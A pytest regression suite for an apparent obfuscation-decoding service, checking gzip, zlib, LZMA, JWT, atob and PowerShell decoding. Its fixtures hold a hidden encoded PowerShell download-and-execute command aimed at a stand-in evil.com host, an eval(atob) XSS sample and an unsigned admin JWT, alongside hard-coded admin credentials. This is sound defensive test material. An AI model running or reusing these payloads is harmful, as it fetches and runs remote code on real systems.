"""Regression tests for compression + JWT + JS atob decoding fixes and 100% benchmark pass."""
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/")
if not BASE_URL:
    with open("/app/frontend/.env") as f:
        for line in f:
            if line.startswith("REACT_APP_BACKEND_URL="):
                BASE_URL = line.split("=", 1)[1].strip().rstrip("/")

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "NivXRay#2026!"


@pytest.fixture(scope="session")
def token():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=30)
    assert r.status_code == 200, f"login failed {r.status_code} {r.text}"
    tok = r.json().get("access_token")
    assert tok
    return tok


@pytest.fixture(scope="session")
def auth_headers(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def test_operations_registry(auth_headers):
    r = requests.get(f"{BASE_URL}/api/operations", headers=auth_headers, timeout=30)
    assert r.status_code == 200
    data = r.json()
    # Response may be list or dict; flatten to op names
    if isinstance(data, dict):
        names = set()
        for v in data.values():
            if isinstance(v, list):
                for op in v:
                    if isinstance(op, dict):
                        names.add(op.get("name") or op.get("id"))
                    else:
                        names.add(op)
            elif isinstance(v, dict):
                names.update(v.keys())
        if not names:
            names = set(data.keys())
    else:
        names = {(o.get("name") or o.get("id")) if isinstance(o, dict) else o for o in data}
    # Names are display names in this registry; check by substring
    lc = " | ".join(n.lower() for n in names if n)
    for needle in ["gzip decompress", "zlib decompress", "lzma", "bzip2 decompress",
                   "jwt decode", "base64 decode", "powershell -encodedcommand"]:
        assert needle in lc, f"missing op '{needle}' in registry"


PAYLOADS = [
    ("gzip", "H4sIAIL2VWoC/0tNzshXyEjNyclXSCvKz1VIr8osAABjdx7zFAAAAA==", "echo hello from gzip"),
    ("zlib", "eJzzSM3JyVdwzs8tKEotLs7Mz1MEAD/qBsg=", "Hello Compression!"),
    ("lzma", "/Td6WFoAAATm1rRGAgAhARYAAAB0L+WjAQAJSGVsbG8gTFpNQQAAAH7LyqERLLdRAAEiChUa4WcftvN9AQAAAAAEWVo=", "Hello LZMA"),
    ("jwt", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhbmFseXN0IiwiZXhwIjoxOTk5OTk5OTk5fQ.", '"sub": "admin"'),
    ("atob", 'eval(atob("YWxlcnQoIlhTUyIp"))', 'alert("XSS")'),
]


def _extract_top_output(js):
    # try common shapes
    for key in ("top_result", "best", "result"):
        v = js.get(key)
        if isinstance(v, dict):
            for k in ("output", "text", "value", "decoded"):
                if k in v and isinstance(v[k], str):
                    return v[k]
        elif isinstance(v, str):
            return v
    return str(js)


@pytest.mark.parametrize("label,raw,expected", PAYLOADS)
def test_decode_magic(auth_headers, label, raw, expected):
    r = requests.post(f"{BASE_URL}/api/decode/magic", headers=auth_headers,
                      json={"input": raw}, timeout=60)
    assert r.status_code == 200, f"[{label}] {r.status_code} {r.text}"
    out = _extract_top_output(r.json())
    assert expected in out, f"[{label}] expected '{expected}' in output. Full: {r.text[:2000]}"


@pytest.mark.parametrize("label,raw,expected", PAYLOADS)
def test_decode_smart(auth_headers, label, raw, expected):
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth_headers,
                      json={"input": raw}, timeout=60)
    assert r.status_code == 200, f"[{label}] {r.status_code} {r.text}"
    js = r.json()
    out = js.get("output", "") if isinstance(js, dict) else str(js)
    # Normalize both by removing whitespace for JSON-ish payloads
    norm_out = out.replace(" ", "")
    norm_exp = expected.replace(" ", "")
    assert norm_exp in norm_out, f"[{label}] expected '{expected}' in smart output. Body: {r.text[:2000]}"


def test_powershell_regression(auth_headers):
    raw = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AeAAuAHAAcwAxACIAKQA="
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth_headers,
                      json={"input": raw}, timeout=60)
    assert r.status_code == 200
    assert "IEX (New-Object Net.WebClient)" in r.text, r.text[:2000]


def test_admin_samples_list(auth_headers):
    r = requests.get(f"{BASE_URL}/api/admin/samples", headers=auth_headers, timeout=30)
    assert r.status_code == 200
    samples = r.json()
    if isinstance(samples, dict):
        samples = samples.get("samples") or samples.get("items") or []
    assert len(samples) >= 17, f"expected >=17, got {len(samples)}"
    # Check compression samples have correct raw_input
    raws = {s.get("raw_input") for s in samples if isinstance(s, dict)}
    for _, raw, _ in PAYLOADS[:3]:  # gzip, zlib, lzma
        assert raw in raws, f"expected raw in seeded samples: {raw[:40]}..."


def test_benchmark_all_100pct(auth_headers):
    r = requests.post(f"{BASE_URL}/api/admin/samples/benchmark/all",
                      headers=auth_headers, json={}, timeout=180)
    assert r.status_code == 200, f"{r.status_code} {r.text[:1000]}"
    data = r.json()
    pass_pct = data.get("pass_pct") or data.get("pass_percentage")
    total = data.get("total") or data.get("total_samples")
    passed = data.get("passed") or data.get("passed_count")
    print(f"Benchmark: total={total} passed={passed} pass_pct={pass_pct}")
    if passed != total:
        # print failing samples
        results = data.get("results") or data.get("items") or []
        for res in results:
            if not res.get("passed", res.get("pass", True)):
                print("FAIL:", res)
    assert pass_pct == 100.0, f"pass_pct={pass_pct} data={data}"
    assert total >= 17
    assert passed == total
